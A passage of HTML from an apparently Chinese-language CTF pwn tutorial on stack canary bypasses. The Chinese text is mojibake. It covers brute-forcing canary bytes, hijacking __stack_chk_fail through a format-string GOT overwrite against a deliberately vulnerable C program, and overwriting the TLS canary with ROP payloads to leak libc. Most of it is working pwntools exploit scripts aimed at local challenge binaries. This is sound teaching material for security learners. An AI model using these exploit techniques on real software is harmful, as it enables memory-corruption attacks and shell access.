class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 32 ä½ç¨‹åºçˆ† 3.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"fun\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                canary <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"canary: \"</span> <span class=\"token operator\">+</span> canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">break</span>   </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>catflag <span class=\"token operator\">=</span> <span class=\"token number\">0x0231</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"welcome\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                catflag <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"NSSCTF\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"æ–¹æ³•å››-åŠ«æŒ__stack_chk_failå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•å››-åŠ«æŒ__stack_chk_failå‡½æ•°\">#</a> æ–¹æ³•å›› åŠ«æŒ__stack_chk_fail å‡½æ•°</h3>\n<h5 id=\"åŸç†-4\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†-4\">#</a> åŸç†</h5>\n<p>åœ¨å¼€å¯ canary ä¿æŠ¤çš„ç¨‹åºä¸­ï¼Œå¦‚æœ canary ä¸å¯¹ï¼Œç¨‹åºä¼šè½¬åˆ°<strong> stack_chk_fail å‡½æ•°æ‰§è¡Œ</strong>ã€‚stack_chk_fail å‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šçš„å»¶è¿Ÿç»‘å®šå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ GOT è¡¨åŠ«æŒè¿™ä¸ªå‡½æ•°ã€‚</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// scf.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// æ ˆæº¢å‡º</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gcc scf.c <span class=\"token parameter variable\">-m32</span> -fstack-protector -no-pie <span class=\"token parameter variable\">-z</span> noexecstack <span class=\"token parameter variable\">-z</span> norelro <span class=\"token parameter variable\">-o</span> scf</pre></td></tr></table></figure><ul>\n<li>åŠ«æŒå‡½æ•°éœ€è¦ä¿®æ”¹ got è¡¨ï¼Œæ‰€ä»¥è¦å…³é—­ relroï¼ˆRELocation Read Onlyï¼‰</li>\n<li>éœ€è¦è°ƒç”¨ getshell å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦å…³é—­ pieï¼ˆPosition Indenpendent Executiveï¼‰</li>\n</ul>\n<h6 id=\"æ£€æŸ¥-2\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥-2\">#</a> æ£€æŸ¥</h6>\n<p><img data-src=\"/img/canary/image-20230804093940998.png\" alt=\"image-20230804093940998\"></p>\n<h6 id=\"ida-4\"><a class=\"markdownIt-Anchor\" href=\"#ida-4\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804094426572.png\" alt=\"image-20230804094426572\"></p>\n<p><img data-src=\"/img/canary/image-20230804094442002.png\" alt=\"image-20230804094442002\"></p>\n<ul>\n<li>æœ‰ä¸ª getshell åé—¨</li>\n<li>main å‡½æ•°ä¸­ printf ç›´æ¥æ‰“å°äº†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®</li>\n</ul>\n<p><strong><u>GOT è¡¨ä¸­å­˜å‚¨çš„æ˜¯å‡½æ•°çš„å®é™…åœ°å€ï¼Œå¦‚æœæŠŠ <code>__stack_chk_fail</code>  å‡½æ•°çš„ got è¡¨åœ°å€æ›¿æ¢ä¸º getshell çš„åœ°å€ï¼Œåœ¨ canary å‡ºé”™çš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨ <code>__stack_chk_fail</code>  æ—¶å°±ä¼šç›´æ¥è·å–åˆ° shellã€‚</u></strong></p>\n<p>è¿™é‡Œåˆ©ç”¨ pwntools ä¸­çš„ fmtstr_payload () å¯ä»¥æ–¹ä¾¿çš„è¿›è¡Œåœ°å€çš„ç¯¡æ”¹</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fmtstr_payload<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> writes<span class=\"token punctuation\">,</span> numbwritten<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> write_size<span class=\"token operator\">=</span>â€˜byteâ€™<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>offsetï¼ˆ<span class=\"token builtin\">int</span>ï¼‰<span class=\"token punctuation\">:</span> å­—ç¬¦ä¸²çš„åç§»</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>writes <span class=\"token punctuation\">(</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> æ³¨å…¥çš„åœ°å€å’Œå€¼ï¼Œ<span class=\"token punctuation\">&#123;</span>target_addr <span class=\"token punctuation\">:</span> change_to<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>æ‰‹å·¥ç¡®è®¤å­—ç¬¦ä¸²çš„åç§»</p>\n<p><img data-src=\"/img/canary/image-20230804094756512.png\" alt=\"image-20230804094756512\"></p>\n<p><code>61616161</code>  æ˜¯ç¬¬ 10 ä¸ªä½ç½®ï¼Œå› æ­¤ offset å– 10</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>stack_chk_fail_got<span class=\"token punctuation\">:</span> getshell<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è¿˜è¦é€ æˆä¸€æ¬¡æº¢å‡ºï¼Œè§¦å‘ <code>__stack_chk_fail</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-4\"><a class=\"markdownIt-Anchor\" href=\"#exp-4\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./scf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./scf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>stack_chk_fail_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__stack_chk_fail'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>getshell <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'getshell'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pl <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>stack_chk_fail_got<span class=\"token punctuation\">:</span> getshell<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pl <span class=\"token operator\">=</span> pl<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"æ–¹æ³•äº”-tslå…¨è¦†ç›–\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ³•äº”-tslå…¨è¦†ç›–\">#</a> æ–¹æ³•äº” TSL å…¨è¦†ç›–</h3>\n<h5 id=\"åŸç†-5\"><a class=\"markdownIt-Anchor\" href=\"#åŸç†-5\">#</a> åŸç†</h5>\n<p>å·²çŸ¥ Canary å‚¨å­˜åœ¨ TLS ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›å‰ä¼šä½¿ç”¨è¿™ä¸ªå€¼è¿›è¡Œå¯¹æ¯”ã€‚å½“æº¢å‡ºå°ºå¯¸è¾ƒå¤§æ—¶ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–æ ˆä¸Šå‚¨å­˜çš„ Canary å’Œ TLS å‚¨å­˜çš„ Canary å®ç°ç»•è¿‡ã€‚</p>\n<h5 id=\"love\"><a class=\"markdownIt-Anchor\" href=\"#love\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnNzY3RmLmNuL3Byb2JsZW0vNDE4Mg==\">love</span></h5>\n<h6 id=\"æ£€æŸ¥-3\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥-3\">#</a> æ£€æŸ¥</h6>\n<p><img data-src=\"/img/canary/image-20230804100611025.png\" alt=\"image-20230804100611025\"></p>\n<h6 id=\"ida-5\"><a class=\"markdownIt-Anchor\" href=\"#ida-5\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804100726428.png\" alt=\"image-20230804100726428\"></p>\n<p><img data-src=\"/img/canary/image-20230804100739512.png\" alt=\"image-20230804100739512\"></p>\n<p>å¾ˆæ˜æ˜¾ï¼Œèƒ½å¤Ÿçœ‹åˆ° canary ä¿æŠ¤ï¼Œå¹¶ä¸”èƒ½æ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå’Œ vuln çš„æ ˆæº¢å‡ºæ¼æ´ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ read å‡½æ•°è¯»å…¥æ•°æ®ï¼Œè®©æ ¼å¼åŒ–å­—ç¬¦è¦†ç›–å†…å­˜åœ°å€ï¼Œä»è€Œç»•è¿‡åˆ¤æ–­ï¼Œè¿›å…¥ vuln ä¸­ã€‚å†é€šè¿‡è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼å’Œæ ˆä¸Šä¸´æ—¶å­˜çš„ canary çš„å€¼ã€‚ç»•è¿‡ canaryï¼Œè¾¾æˆæ”»å‡»æ‰‹æ®µã€‚</p>\n<p><img data-src=\"/img/canary/image-20230804101610167.png\" alt=\"image-20230804101610167\"></p>\n<p>ä»ä¸­å¯ä»¥æ‰¾åˆ° 0x22bã€0x208 æ¢ç®—ä¸€ä¸‹å°±æ˜¯ 555 å’Œ 520ï¼Œè®¡ç®—ä¸€ä¸‹åç§»ä¸º 9</p>\n<p>æ‰€ä»¥ payload</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%520s%9$n'</span></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿèƒ½å‘ç° canary çš„å½±å­ï¼Œåœ¨åç§» 15 çš„ä½ç½®ã€‚ç»è¿‡å¤šæ¬¡è¾“å…¥è¿™ä¸ªå­—æ®µï¼Œè¯å®äº†æˆ‘ä»¬çŒœæµ‹ã€‚æ‰€ä»¥è¿™é¢˜ä¹Ÿå¯ä»¥é€šè¿‡æ³„éœ² canary æ¥ç»•è¿‡ã€‚</p>\n<p>ç»•è¿‡åˆ¤æ–­ä¹‹åã€‚</p>\n<p>æ³„éœ² libc åŸºå€ã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0xa00</span></pre></td></tr></table></figure><p>æœ€åè·å– shell å³å¯ã€‚</p>\n<h6 id=\"exp-5\"><a class=\"markdownIt-Anchor\" href=\"#exp-5\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sla     <span 